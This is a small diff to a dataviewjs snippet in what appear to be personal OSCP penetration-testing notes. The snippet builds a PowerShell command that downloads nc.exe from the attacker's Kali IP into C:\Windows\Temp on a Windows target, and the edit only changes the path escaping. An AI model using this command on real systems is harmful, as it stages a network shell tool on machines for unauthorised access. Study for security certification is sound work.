@@ -4,7 +4,7 @@ transfer file from kali to window target
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `powershell wget http://${KaliIP}/nc.exe -OutFile C:\Windows\Temp\nc.exe`;
+const command = `powershell wget http://${KaliIP}/nc.exe -OutFile C:\\\Windows\\\Temp\\nc.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
